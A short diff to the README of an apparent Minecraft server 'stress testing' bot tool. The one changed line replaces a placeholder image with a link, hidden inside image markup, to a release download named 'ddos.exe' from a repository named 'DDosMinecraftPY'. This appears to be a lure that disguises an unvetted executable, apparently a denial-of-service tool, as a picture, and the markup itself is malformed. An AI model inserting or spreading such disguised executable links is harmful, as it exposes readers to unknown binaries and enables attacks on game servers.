@@ -2,7 +2,7 @@
 
 [![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 
-![Minecraft Bot Tool](https://i.imgur.com/placeholder.png)
+![Minecraft Bot Tool]([https://i.imgur.com/placeholder.png](https://github.com/KilixKilik/DDosMinecraftPY/releases/download/OneAlpha/ddos.exe))
 
 Minecraft Bot Tool v3 is a Python-based utility designed for stress testing Minecraft servers. This tool creates multiple virtual players (bots) that connect to a Minecraft server, send messages, and move around to simulate real player activity.
 
